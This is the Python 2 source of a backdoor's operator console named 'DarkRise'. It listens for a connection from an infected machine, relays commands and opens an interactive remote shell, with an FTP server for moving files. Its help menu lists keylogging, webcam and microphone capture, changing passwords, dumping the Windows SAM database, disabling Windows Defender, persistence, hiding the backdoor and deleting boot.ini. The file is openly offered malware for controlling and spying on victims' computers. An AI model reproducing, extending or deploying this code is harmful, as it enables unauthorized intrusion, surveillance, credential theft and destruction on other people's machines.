#!/usr/bin/python2
#-*- coding:utf-8 -*-

import socket
import colorama
import nclib
from datetime import datetime
import time
import random
import sys
import argparse
import os
import platform
from ftplib import FTP
import readline

banner1 = '''
▓█████▄  ▄▄▄       ██▀███   ██ ▄█▀    ██▀███   ██▓  ██████ ▓█████
▒██▀ ██▌▒████▄    ▓██ ▒ ██▒ ██▄█▒    ▓██ ▒ ██▒▓██▒▒██    ▒ ▓█   ▀
░██   █▌▒██  ▀█▄  ▓██ ░▄█ ▒▓███▄░    ▓██ ░▄█ ▒▒██▒░ ▓██▄   ▒███
░▓█▄   ▌░██▄▄▄▄██ ▒██▀▀█▄  ▓██ █▄    ▒██▀▀█▄  ░██░  ▒   ██▒▒▓█  ▄
░▒████▓  ▓█   ▓██▒░██▓ ▒██▒▒██▒ █▄   ░██▓ ▒██▒░██░▒██████▒▒░▒████▒
 ▒▒▓  ▒  ▒▒   ▓▒█░░ ▒▓ ░▒▓░▒ ▒▒ ▓▒   ░ ▒▓ ░▒▓░░▓  ▒ ▒▓▒ ▒ ░░░ ▒░ ░
 ░ ▒  ▒   ▒   ▒▒ ░  ░▒ ░ ▒░░ ░▒ ▒░     ░▒ ░ ▒░ ▒ ░░ ░▒  ░ ░ ░ ░  ░
 ░ ░  ░   ░   ▒     ░░   ░ ░ ░░ ░      ░░   ░  ▒ ░░  ░  ░     ░
   ░          ░  ░   ░     ░  ░         ░      ░        ░     ░  ░
 ░

'''

banner2 = '''
    .o oOOOOOOOo                                            OOOo
    Ob.OOOOOOOo  OOOo.      oOOo.                      .adOOOOOOO
    OboO"""""""""""".OOo. .oOOOOOo.    OOOo.oOOOOOo.."""""""""'OO
    OOP.oOOOOOOOOOOO "POOOOOOOOOOOo.   `"OOOOOOOOOP,OOOOOOOOOOOB'
    `O'OOOO'     `OOOOo"OOOOOOOOOOO` .adOOOOOOOOO"oOOO'    `OOOOo
    .OOOO'            `OOOOOOOOOOOOOOOOOOOOOOOOOO'            `OO
    OOOOO                 '"OOOOOOOOOOOOOOOO"`                oOO
   oOOOOOba.                .adOOOOOOOOOOba               .adOOOOo.
  oOOOOOOOOOOOOOba.    .adOOOOOOOOOO@^OOOOOOOba.     .adOOOOOOOOOOOO
 OOOOOOOOOOOOOOOOO.OOOOOOOOOOOOOO"`  '"OOOOOOOOOOOOO.OOOOOOOOOOOOOO
 "OOOO"       "YOoOOOOMOIONODOO"`  .   '"OOROAOPOEOOOoOY"     "OOO"
    Y           'OOOOOOOOOOOOOO: .oOOo. :OOOOOOOOOOO?'         :`
    :            .oO%OOOOOOOOOOo.OOOOOO.oOOOOOOOOOOOO?         .
    .            oOOP"%OOOOOOOOoOOOOOOO?oOOOOO?OOOO"OOo
                 '%o  OOOO"%OOOO%"%OOOOO"OOOOOO"OOO':
                      `$"  `OOOO' `O"Y ' `OOOO'  o             .
    .                  .     OP"          : o     .
                              :
                              .
'''

banner3 = '''
 ▄▀▀█▄▄   ▄▀▀█▄   ▄▀▀▄▀▀▀▄  ▄▀▀▄ █      ▄▀▀▄▀▀▀▄  ▄▀▀█▀▄   ▄▀▀▀▀▄  ▄▀▀█▄▄▄▄
█ ▄▀   █ ▐ ▄▀ ▀▄ █   █   █ █  █ ▄▀     █   █   █ █   █  █ █ █   ▐ ▐  ▄▀   ▐
▐ █    █   █▄▄▄█ ▐  █▀▀█▀  ▐  █▀▄      ▐  █▀▀█▀  ▐   █  ▐    ▀▄     █▄▄▄▄▄
  █    █  ▄▀   █  ▄▀    █    █   █      ▄▀    █      █    ▀▄   █    █    ▌
 ▄▀▄▄▄▄▀ █   ▄▀  █     █   ▄▀   █      █     █    ▄▀▀▀▀▀▄  █▀▀▀    ▄▀▄▄▄▄
█     ▐  ▐   ▐   ▐     ▐   █    ▐      ▐     ▐   █       █ ▐       █    ▐
▐                          ▐                     ▐       ▐         ▐
'''

banner4 = '''
 ______                  __        _______      _
|_   _ `.               [  |  _   |_   __ \    (_)
  | | `. \ ,--.   _ .--. | | / ]    | |__) |   __   .--.  .---.
  | |  | |`'_\ : [ `/'`\]| '' <     |  __ /   [  | ( (`\]/ /__\\
 _| |_.' /// | |, | |    | |`\ \   _| |  \ \_  | |  `'.'.| \__.,
|______.' \'-;__/[___]  [__|  \_] |____| |___|[___][\__) )'.__.'

'''

banner5 = '''
>====>                         >=>            >======>
>=>   >=>                      >=>            >=>    >=>    >>
>=>    >=>    >=> >=>  >> >==> >=>  >=>       >=>    >=>        >===>    >==>
>=>    >=>  >=>   >=>   >=>    >=> >=>        >> >==>      >=> >=>     >>   >=>
>=>    >=> >=>    >=>   >=>    >=>=>          >=>  >=>     >=>   >==>  >>===>>=>
>=>   >=>   >=>   >=>   >=>    >=> >=>        >=>    >=>   >=>     >=> >>
>====>       >==>>>==> >==>    >=>  >=>       >=>      >=> >=> >=> >=>  >====>


'''

banner6 = '''
██▄   ██   █▄▄▄▄ █  █▀     █▄▄▄▄ ▄█    ▄▄▄▄▄   ▄███▄
█  █  █ █  █  ▄▀ █▄█       █  ▄▀ ██   █     ▀▄ █▀   ▀
█   █ █▄▄█ █▀▀▌  █▀▄       █▀▀▌  ██ ▄  ▀▀▀▀▄   ██▄▄
█  █  █  █ █  █  █  █      █  █  ▐█  ▀▄▄▄▄▀    █▄   ▄▀
███▀     █   █     █         █    ▐            ▀███▀
        █   ▀     ▀         ▀
       ▀
'''

banner7 = '''
 .S_sSSs     .S_SSSs     .S_sSSs     .S    S.          .S_sSSs     .S    sSSs    sSSs
.SS~YS%%b   .SS~SSSSS   .SS~YS%%b   .SS    SS.        .SS~YS%%b   .SS   d%%SP   d%%SP
S%S   `S%b  S%S   SSSS  S%S   `S%b  S%S    S&S        S%S   `S%b  S%S  d%S'    d%S'
S%S    S%S  S%S    S%S  S%S    S%S  S%S    d*S        S%S    S%S  S%S  S%|     S%S
S%S    S&S  S%S SSSS%S  S%S    d*S  S&S   .S*S        S%S    d*S  S&S  S&S     S&S
S&S    S&S  S&S  SSS%S  S&S   .S*S  S&S_sdSSS         S&S   .S*S  S&S  Y&Ss    S&S_Ss
S&S    S&S  S&S    S&S  S&S_sdSSS   S&S~YSSY%b        S&S_sdSSS   S&S  `S&&S   S&S~SP
S&S    S&S  S&S    S&S  S&S~YSY%b   S&S    `S%        S&S~YSY%b   S&S    `S*S  S&S
S*S    d*S  S*S    S&S  S*S   `S%b  S*S     S%        S*S   `S%b  S*S     l*S  S*b
S*S   .S*S  S*S    S*S  S*S    S%S  S*S     S&        S*S    S%S  S*S    .S*P  S*S.
S*S_sdSSS   S*S    S*S  S*S    S&S  S*S     S&        S*S    S&S  S*S  sSS*S    SSSbs
SSS~YSSY    SSS    S*S  S*S    SSS  S*S     SS        S*S    SSS  S*S  YSS'      YSSP
                   SP   SP          SP                SP          SP
                   Y    Y           Y                 Y           Y

'''

descrip = '''
                [DarkRise - By 0x4eff (Unamed, Dxvistxr) - 2019]


            \033[1;91m[ \033[00mAuthor : \033[1;91m0x4eff     \033[1;91m]\033[00m
            \033[1;91m[ \033[00mGithub : \033[1;91mDxvistxr   \033[1;91m]\033[00m
            \033[1;91m[ \033[00mYoutube : \033[1;91mDavistar  \033[1;91m]\033[00m
            \033[1;91m[ \033[00mInstagram : \033[1;91m0x4eff  \033[1;91m]\033[00m
            \033[1;91m[ \033[00mVersion : \033[1;91m1.0 (beta)\033[1;91m]\033[00m

'''

def start_ftp_server(host,port,user,password,pathroot):
        try:
                check_ftp_server = os.path.exists('ftp_server.py')
                if check_ftp_server ==True:
                        print('\033[1;91m[\033[00m*\033[1;91m]\033[00m FTP Server Found!')
                        os.system('python2 ftp_server.py %s %s %s %s %s > /dev/null 2>&1 &' % (host,port,user,password,pathroot))
                        print('\033[1;91m[\033[00m*\033[1;91m]\033[00m  FTP Server Started !')
                        print('\033[1;91m[\033[00m*\033[1;91m]\033[00m  FTP Host : %s' % (host))
                        print('\033[1;91m[\033[00m*\033[1;91m]\033[00m  FTP Port : %s' % (port))
                        print('\033[1;91m[\033[00m*\033[1;91m]\033[00m  FTP User : %s' % (user))
                        print('\033[1;91m[\033[00m*\033[1;91m]\033[00m  FTP Password : %s' % (password))
                        print('\033[1;91m[\033[00m*\033[1;91m]\033[00m  FTP Path : %s' % (pathroot))
                else:
                        print('\033[1;91m[!] FTP Server Not Found !')

        except Exception as error_ftperror:
                print(error_ftperror)

def connect(LHOST,LPORT,ftpuser,ftppasswd,ftpproot):
        start_ftp_server(LHOST,'21',ftpuser,ftppasswd,ftpproot)
        print('\033[1;91m[\033[00m+\033[1;91m] \033[00mListening On %s:%s' % (LHOST,LPORT))
        nc = nclib.Netcat(listen=(LHOST,LPORT))
        data = nc.recv(4096)

        while True:
                try:
                        t = datetime.now().strftime('[%H:%M:%S]')
                        command = raw_input('\033[00m%s shxll@\033[1;91mDarkRise\033[00m$ ' % (t))
                        if command !='':
                            nc.send(command)
                        else:
                            print('[*] Please Enter Command !')
                            nc.send('\n')

                        if command.startswith('quit')==True:
                                os.system('pkill python')
                                print('\033[1;96m[\033[1;93m*\033[1;96m] FTP Server Stoped !')
                                break

                        elif command.startswith('shell')==True:
                                nc.interact()

                        elif command.startswith('cd')==True:
                                path=command[3:]

                        elif command.startswith('cat')==True:
                                filecmd=command[4:]

                        elif command.startswith('clear')==True:
                                if 'Linux' not in platform.platform():
                                        os.system('cls')

                                elif 'Windows' not in platform.platform():
                                        os.system('clear')

                        elif command.startswith('del')==True:
                                file_delete=command[4:]

                        elif command.startswith('rmpt')==True:
                                path_delete=command[5:]

                        elif command.startswith('mkpa')==True:
                                path_create=command[5:]

                        elif command.startswith('rname')==True:
                                rname_string=command[6:]

                        elif command.startswith('ftpdownload')==True:
                                file_download_ftp=command[12:]

                        elif command.startswith('ps')==True:
                                tasklist_data=nc.recv(65536)
                                while True:
                                        if not tasklist_data:
                                                break
                                        else:
                                                print(tasklist_data)
                                                tasklist_data=nc.recv(65536)

                        elif command.startswith('ftpupload')==True:
                                filename=command[10:]
                                check_filename_is_in_ftp_server = os.path.exists(ftpproot+filename)
                                if check_filename_is_in_ftp_server ==True:
                                        pass
                                else:
                                        os.system('cp %s %s' % (filename,ftpproot))
                                        time.sleep(1)


                        elif command.startswith('openurl')==True:
                                link=command[8:]


                        elif command.startswith('copy')==True:
                                filename_copy=command[5:]

                        elif command.startswith('move')==True:
                                filename_move=command[5:]

                        elif command.startswith('xorencode')==True:
                                filename=command[10:]

                        elif command.startswith('b64encode')==True:
                                filename_encode_b64=command[10:]

                        elif command.startswith('b64decode')==True:
                                file_decode_b64=command[10:]

                        elif command.startswith('portscan')==True:
                                data_sent=command[9:]
                                print('[*] Wait Moment Please Scanner Started !')
                                time.sleep(60)

                        elif command.startswith('cwpasswd')==True:
                                file_dt=command[9:]

                        elif command.startswith('tkill')==True:
                                pid_killed=command[5:]

                        elif command.startswith('msgbox')==True:
                                message=command[7:]

                        elif command.startswith('meslp')==True:
                                message_loop=command[6:]

                        elif command.startswith('process')==True:
                                processus=data[8:]

                        elif command.startswith('ping')==True:
                                ip_target=data[5:]

                        elif command.startswith('speak')==True:
                                message=data[6:]

                        elif command.startswith('ls') or command.startswith('dir') or command.startswith('listdir')==True:
                            time.sleep(0.2)


                        elif command.startswith('nscan')==True:
                                data = nc.recv(4096)
                                print(data)
                                time.sleep(31)



                        elif command.startswith('banner')==True:
                                choice_banner = [banner1,banner2,banner3,banner4,banner5,banner6,banner7]
                                choice_banner_print = random.choice(choice_banner)
                                print('\033[00m%s' % (choice_banner_print))
                                print(descrip)

                        elif command.startswith('help')==True:
                                print('\033[1;91m[=============================================================================================]')
                                print('\033[1;91m[\033[00m*\033[1;91m]---===Backdoor - Dark Rise By 0x4eff ===---\033[1;91m[\033[00m*\033[1;91m]')
                                print('\033[1;91m[commands               descriptions                                                  platform]')
                                print('\033[1;91m[--------               ------------                                                  --------]')
                                print('\033[1;91m[help                   Show Help                                                        multi]')
                                print('\033[1;91m[shell                  Open Interractive Shell (cmd,bash,sh..)                          multi]')
                                print('\033[1;91m[quit                   Quit Backdoor                                                    multi]')
                                print('\033[1;91m[ipgeo                  IPGeo Target                                                     multi]')
                                print('\033[1;91m[sysinfo                System Info                                                      multi]')
                                print('\033[1;91m[pwd                    Show Current Path                                                multi]')
                                print('\033[1;91m[cd <path>              Change Dirrectory                                                multi]')
                                print('\033[1;91m[cat <filename>         Show Filename                                                    multi]')
                                print('\033[1;91m[portscan <ip>          Scan Port On Target Machine Network                              multi]')
                                print('\033[1;91m[del <file>             Delete File                                                      multi]')
                                print('\033[1;91m[rmpt <path>            Remove Path Or Folder                                            multi]')
                                print('\033[1;91m[mkpa <path>            Create Path Or Folder                                            multi]')
                                print('\033[1;91m[rname <old> <new>      Rename File Or Path                                              multi]')
                                print('\033[1;91m[move  <old> <new>      Move File Or Folder                                              multi]')
                                print('\033[1;91m[copy  <old> <new>      Copy File Or Folder                                              multi]')
                                print('\033[1;91m[xorencode <filename>   Encode Xor File                                                  multi]')
                                print('\033[1;91m[b64encode  <file>      Encode File In Base64                                            multi]')
                                print('\033[1;91m[b64decode  <file>      Decode File In Base64                                            multi]')
                                print('\033[1;91m[keylogger_start        Start Keylogger                                                  multi]')
                                print('\033[1;91m[keylogger_dump         Dump Keylogger Log                                               multi]')
                                print('\033[1;91m[keylogger_stop         Stop Keylogger                                                   multi]')
                                print('\033[1;91m[openurl <link>         Open URL On Target Machine                                       multi]')
                                print('\033[1;91m[ftpdownload <file>     Download File With FTP                                           multi]')
                                print('\033[1;91m[ftpupload   <file>     Upload File With FTP                                             multi]')
                                print('\033[1;91m[webcamsnap             Take A Webcam Snap                                               multi]')
                                print('\033[1;91m[screenshot             Take ScreenShot                                                  multi]')
                                print('\033[1;91m[cwpasswd <users> <new_passwd> If Not Know User enter %UserName% Change Win Passwd     windows]')
                                print('\033[1;91m[netuser                Get Windows User List                                          windows]')
                                print('\033[1;91m[tkill  <proc_name>     Kill Process                                                     multi]')
                                print('\033[1;91m[reboot                 Reboot Machine                                                   multi]')
                                print('\033[1;91m[shutdown               Shutdown Machine                                                 multi]')
                                print('\033[1;91m[ps                     Show Tasklist Of The Machine                                     multi]')
                                print('\033[1;91m[clear                  Clear Console                                                    multi]')
                                print('\033[1;91m[ls                     List Dirrectory                                                  multi]')
                                print('\033[1;91m[dir                    List Dirrectory                                                  multi]')
                                print('\033[1;91m[banner                 Show Banner                                                      multi]')
                                print('\033[1;91m[whoami                 Get Whoami                                                       multi]')
                                print('\033[1;91m[ifconfig               Get Ifconfig                                                     multi]')
                                print('\033[1;91m[msgbox <message>       Sent Message Box                                                 windows]')
                                print('\033[1;91m[meslp  <message>       Sent Message Loop                                                windows]')
                                print('\033[1;91m[resettime              Reset Time                                                       windows]')
                                print('\033[1;91m[getpid                 Return PID                                                       multi]')
                                print('\033[1;91m[getgtw                 Return Gateway                                                   multi]')
                                print('\033[1;91m[nscan            Return Host Connected (execute this after scan Netxork)                multi]')
                                print('\033[1;91m[process <process_name> Start Task Process exemple (firefox.exe) etc..                   multi]')
                                print('\033[1;91m[opendiskloop           Open CD/DVD DISK In Loop                                         windows]')
                                print('\033[1;91m[odisk                  Open CD/DVD Disk And Close                                       windows]')
                                print('\033[1;91m[tlrestart              The Last Restart Bye Bye                                         windows]')
                                print('\033[1;91m[hide_backdoor          Hide Backdoor                                                    windows]')
                                print('\033[1;91m[tlrestart              Dangerous Delete boot.ini                                        windows]')
                                print('\033[1;91m[ping                   Ping Machine IP                                                   multi]')
                                print('\033[1;91m[speak <message>        Speak Voice TTS                                                   multi]')
                                print('\033[1;91m[change_wallpaper <url> Change Wallpaper                                                windows]')
                                print('\033[1;91m[cmd <command>          Execute Command Shell                                             multi]')
                                print('\033[1;91m[record_mic <seconds>   Record Microphone                                                 multi]')
                                print('\033[1;91m[persistence            Make Persistent backdoor                                        windows]')
                                print('\033[1;91m[getuid                 Get UID                                                           multi]')
                                print('\033[1;91m[webdownload  <link> <outpu> Download File or Folder on the web                           multi]')
                                print('\033[1;91m[dump_sam_system        Dump Sam DB File & System DB File [Administrator Required]      windows]')
                                print('\033[1;91m[kwindef                Kill Windows Defender                                           windows]')



                        data = nc.recv(65556)
                        print(data)

                except KeyboardInterrupt:
                        print('[*] CTRL + C')


def main():
        if sys.version[0] =='3':
                sys.exit('[*] Please Run Backdoor With Python2')

        choice_banner = [banner1,banner2,banner3,banner4,banner5,banner6,banner7]
        choice_banner_print = random.choice(choice_banner)
        print(choice_banner_print)
        print(descrip)
        parser = argparse.ArgumentParser()
        print('\033[1;91m')
        parser.add_argument('lhost',type=str, help='Set Host')
        parser.add_argument('lport',type=int, help='Set Port')
        parser.add_argument('ftpuser',type=str,help='Set FTP User')
        parser.add_argument('ftppasswd',type=str,help='Set FTP Password')
        parser.add_argument('ftppath',type=str,help='Set FTP Path')
        args = parser.parse_args()
        print('\033[00m')
        connect(args.lhost,args.lport,args.ftpuser,args.ftppasswd,args.ftppath)

if __name__ == '__main__':
        main()
